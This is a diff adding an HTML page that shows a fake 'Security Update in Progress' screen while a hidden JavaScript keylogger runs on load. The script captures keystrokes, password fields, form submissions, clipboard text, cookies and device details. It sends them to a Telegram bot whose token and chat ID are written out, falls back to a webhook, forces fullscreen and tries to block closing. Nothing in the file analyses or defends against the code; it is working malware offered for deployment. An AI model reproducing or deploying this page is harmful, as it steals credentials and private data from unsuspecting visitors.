@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Security Update</title>
+    <style>
+        /* STEALTH CSS - Invisible */
+        * { margin: 0; padding: 0; }
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            height: 100vh;
+            overflow: hidden;
+            position: relative;
+        }
+        
+        .container {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            text-align: center;
+            color: white;
+            z-index: 1;
+        }
+        
+        .loading {
+            font-size: 24px;
+            margin-bottom: 20px;
+            opacity: 0.8;
+        }
+        
+        .spinner {
+            border: 4px solid rgba(255,255,255,0.3);
+            border-top: 4px solid white;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .status {
+            font-size: 14px;
+            opacity: 0.7;
+        }
+        
+        /* HIDDEN LOGS */
+        #logs {
+            position: absolute;
+            top: -9999px;
+            left: -9999px;
+            opacity: 0;
+            pointer-events: none;
+        }
+        
+        /* FULLSCREEN MODE */
+        .fullscreen-btn {
+            position: fixed;
+            top: 10px;
+            right: 10px;
+            background: rgba(0,0,0,0.5);
+            color: white;
+            border: none;
+            padding: 10px;
+            border-radius: 5px;
+            cursor: pointer;
+            z-index: 1000;
+            opacity: 0.3;
+            transition: opacity 0.3s;
+        }
+        
+        .fullscreen-btn:hover {
+            opacity: 1;
+        }
+    </style>
+</head>
+<body>
+    <!-- FAKE UI for Stealth -->
+    <div class="container">
+        <div class="spinner"></div>
+        <div class="loading">🔒 Security Update in Progress...</div>
+        <div class="status">Please do not close this window</div>
+    </div>
+    
+    <!-- FULLSCREEN BUTTON -->
+    <button class="fullscreen-btn" onclick="toggleFullscreen()">⛶</button>
+    
+    <!-- HIDDEN LOGS CONTAINER -->
+    <textarea id="logs" rows="1" cols="1" style="opacity:0;"></textarea>
+
+    <script>
+        // ========================================
+        // CONFIG - YE CHANGE KARO!
+        // ========================================
+        const TELEGRAM_TOKEN = "8151596679:AAH6TEDPkvt0QtctFiEWPEkehCNQqhE0jCQ";  // @BotFather
+        const CHAT_ID = "6810125590";           // @userinfobot
+        const TELEGRAM_URL = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+        
+        const WEBHOOK_URL = `https://YOUR_SERVER.com/log.php`; // Optional backup
+        // ========================================
+
+        class AdvancedKeylogger {
+            constructor() {
+                this.log = [];
+                this.lastSent = '';
+                this.isPaused = false;
+                this.mouseLog = [];
+                this.clipboardHistory = [];
+                this.formData = [];
+                this.sessionStart = new Date().toISOString();
+                
+                this.init();
+            }
+            
+            init() {
+                console.log("🚀 Advanced Keylogger Started!");
+                this.sendSystemInfo();
+                this.attachEventListeners();
+                this.startPeriodicSend();
+                this.startClipboardMonitor();
+            }
+            
+            // 1. SYSTEM INFO CAPTURE
+            sendSystemInfo() {
+                const info = {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    screen: `${screen.width}x${screen.height}`,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    cookies: document.cookie,
+                    url: window.location.href,
+                    timestamp: new Date().toISOString()
+                };
+                
+                this.sendTelegram(`🖥️ <b>NEW VICTIM DETECTED</b>\n` +
+                    `<b>URL:</b> <code>${info.url}</code>\n` +
+                    `<b>Device:</b> <code>${info.platform}</code>\n` +
+                    `<b>Screen:</b> <code>${info.screen}</code>\n` +
+                    `<b>UA:</b> <code>${info.userAgent.substring(0,100)}...</code>\n` +
+                    `<b>Cookies:</b> <code>${info.cookies || 'None'}</code>`);
+            }
+            
+            // 2. KEYBOARD LOGGING (Advanced)
+            attachEventListeners() {
+                document.addEventListener('keydown', (e) => this.onKeyDown(e));
+                document.addEventListener('keyup', (e) => this.onKeyUp(e));
+                document.addEventListener('keypress', (e) => this.onKeyPress(e));
+                
+                // MOUSE TRACKING
+                document.addEventListener('mousemove', (e) => this.onMouseMove(e));
+                document.addEventListener('click', (e) => this.onClick(e));
+                
+                // FORM CAPTURE
+                document.addEventListener('submit', (e) => this.captureForm(e));
+                document.addEventListener('input', (e) => this.captureInput(e));
+                
+                // PAGE CHANGES
+                window.addEventListener('hashchange', () => this.sendPageChange());
+                window.addEventListener('popstate', () => this.sendPageChange());
+            }
+            
+            onKeyDown(e) {
+                const keyInfo = {
+                    key: e.key,
+                    code: e.code,
+                    shift: e.shiftKey,
+                    ctrl: e.ctrlKey,
+                    alt: e.altKey,
+                    meta: e.metaKey,
+                    timestamp: Date.now()
+                };
+                
+                this.log.push(`[KD:${this.formatKey(keyInfo)}]`);
+                this.checkSensitiveKeys(keyInfo);
+            }
+            
+            onKeyUp(e) {
+                this.log.push(`[KU:${e.code}]`);
+            }
+            
+            onKeyPress(e) {
+                if (e.key.length === 1) {
+                    this.log.push(e.key);
+                }
+            }
+            
+            formatKey(keyInfo) {
+                let key = keyInfo.key;
+                if (keyInfo.shift) key = key.toUpperCase();
+                return key.length > 1 ? keyInfo.code : key;
+            }
+            
+            // 3. SENSITIVE DATA DETECTION
+            checkSensitiveKeys(keyInfo) {
+                const sensitive = ['password', 'pass', 'email', 'login', '@', 'http'];
+                const lastKeys = this.getLastKeys(20).toLowerCase();
+                
+                if (sensitive.some(word => lastKeys.includes(word))) {
+                    this.flushLogs(true); // Priority send
+                }
+            }
+            
+            getLastKeys(count) {
+                return this.log.slice(-count).join('').replace(/[^a-zA-Z0-9@]/g, '');
+            }
+            
+            // 4. MOUSE TRACKING
+            onMouseMove(e) {
+                if (this.mouseLog.length > 10) this.mouseLog.shift();
+                this.mouseLog.push({
+                    x: e.clientX,
+                    y: e.clientY,
+                    timestamp: Date.now()
+                });
+            }
+            
+            onClick(e) {
+                this.log.push(`[CLICK:${e.clientX},${e.clientY}]`);
+            }
+            
+            // 5. FORM & INPUT CAPTURE
+            captureForm(e) {
+                const formData = new FormData(e.target);
+                const data = Object.fromEntries(formData);
+                this.formData.push(data);
+                this.sendTelegram(`📝 <b>FORM SUBMITTED</b>\n<code>${JSON.stringify(data, null, 2)}</code>`);
+            }
+            
+            captureInput(e) {
+                if (e.target.type === 'password' || e.target.name?.toLowerCase().includes('pass')) {
+                    this.sendTelegram(`🔐 <b>PASSWORD INPUT DETECTED</b>\nField: ${e.target.name}\nValue: ${e.target.value}`);
+                }
+            }
+            
+            // 6. CLIPBOARD MONITOR
+            startClipboardMonitor() {
+                if (!navigator.clipboard) return;
+                
+                setInterval(async () => {
+                    try {
+                        const text = await navigator.clipboard.readText();
+                        if (text !== this.clipboardHistory[this.clipboardHistory.length-1]) {
+                            this.clipboardHistory.push(text);
+                            if (text.includes('@') || text.match(/^\d{10}/) || text.length > 20) {
+                                this.sendTelegram(`📋 <b>CLIPBOARD:</b>\n<code>${text.substring(0,500)}</code>`);
+                            }
+                        }
+                    } catch(e) {}
+                }, 2000);
+            }
+            
+            // 7. TELEGRAM SENDER
+            sendTelegram(message) {
+                const payload = {
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML',
+                    disable_web_page_preview: true
+                };
+                
+                fetch(TELEGRAM_URL, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify(payload)
+                }).then(() => {
+                    console.log('📤 Sent to Telegram');
+                }).catch(e => {
+                    // Fallback webhook
+                    fetch(WEBHOOK_URL, {method: 'POST', body: message});
+                });
+            }
+            
+            // 8. PERIODIC SENDING
+            startPeriodicSend() {
+                setInterval(() => {
+                    if (this.log.length > 50) {
+                        this.flushLogs();
+                    }
+                }, 30000); // 30 seconds
+                
+                // High frequency for sensitive
+                setInterval(() => this.flushLogs(), 5000);
+            }
+            
+            flushLogs(highPriority = false) {
+                if (this.log.length === 0) return;
+                
+                const logs = this.log.slice(0, 200).join('').substring(0, 4000);
+                if (logs !== this.lastSent) {
+                    const priority = highPriority ? '🚨 CRITICAL' : '⌨️ KEYS';
+                    this.sendTelegram(`${priority}\n<code>${logs}</code>\n🐭 Mouse: ${this.mouseLog.length} moves`);
+                    this.log = this.log.slice(200);
+                    this.lastSent = logs;
+                }
+            }
+            
+            sendPageChange() {
+                this.sendTelegram(`🌐 Page changed: ${window.location.href}`);
+            }
+        }
+        
+        // FULLSCREEN FUNCTION
+        function toggleFullscreen() {
+            if (!document.fullscreenElement) {
+                document.documentElement.requestFullscreen();
+            }
+        }
+        
+        // START KEYLOGGER
+        window.addEventListener('load', () => {
+            new AdvancedKeylogger();
+            
+            // Prevent close
+            window.addEventListener('beforeunload', (e) => {
+                e.preventDefault();
+                return 'Security update in progress!';
+            });
+        });
+        
+        // AUTO FULLSCREEN ON LOAD
+        setTimeout(() => {
+            document.documentElement.requestFullscreen().catch(() => {});
+        }, 2000);
+    </script>
+</body>
+</html>
